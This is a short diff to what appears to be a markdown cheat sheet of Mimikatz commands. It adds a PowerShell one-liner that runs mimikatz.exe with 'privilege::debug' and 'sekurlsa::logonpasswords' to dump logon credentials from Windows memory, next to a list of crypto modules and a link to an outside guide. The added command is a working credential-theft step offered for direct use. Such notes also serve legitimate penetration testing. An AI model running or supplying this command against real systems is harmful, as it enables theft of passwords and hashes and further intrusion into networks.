@@ -23,6 +23,11 @@ crypto::capi
 crypto::cng
 ```
 
+one-liner usage (runs commands in order)
+```powershell
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
+
 mimikatz guide
 ```text
 https://adsecurity.org/?page_id=1821
